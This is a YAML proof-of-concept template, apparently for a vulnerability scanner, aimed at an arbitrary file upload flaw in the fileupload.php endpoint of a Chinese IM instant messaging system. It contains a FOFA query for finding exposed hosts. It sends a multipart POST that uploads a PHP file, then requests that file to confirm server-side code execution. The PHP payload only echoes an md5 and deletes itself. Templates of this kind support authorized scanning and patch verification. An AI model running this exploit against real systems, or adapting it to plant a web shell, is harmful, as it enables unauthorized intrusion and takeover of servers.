id: poc-yaml-ims-fileupload-php-anyfile-upload
info:
  name: IM即时通讯系统 fileupload.php 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: IM即时通讯系统
  fofa: body="/superloginAction.html" || "im.smiaoshen.com"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /static/lib/webuploader/0.1.5/server/fileupload.php
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
  data: '------WebKitFormBoundaryTqkdY1lCvbvpmown

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"

    Content-Type: text/plain


    <?php echo md5({{.t1}});unlink(__FILE__);?>

    ------WebKitFormBoundaryTqkdY1lCvbvpmown--'
  expression: status_code == 200 && contains(body,"jsonrpc") && contains(body,"id")
- method: GET
  path: /static/lib/webuploader/0.1.5/server/upload/{{.t1}}.php
  expression: status_code == 200 && body == t2
transport: http
